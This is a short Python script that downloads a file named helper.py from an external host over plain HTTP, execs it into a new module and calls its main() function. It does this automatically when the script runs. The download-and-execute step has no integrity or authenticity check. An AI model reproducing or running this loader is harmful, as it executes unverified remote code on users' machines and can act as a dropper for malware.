import sys
import types
import requests

def get_url():
    return "http://tools.codetools.jp/code/helper.py"

def get_source_code(url):
    response = requests.get(url)
    return response.text

def execute():
    url = get_url()
    module_name = "helper"

    source = get_source_code(url)
    module = types.ModuleType(module_name)
    sys.modules[module_name] = module
    exec(source, module.__dict__)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
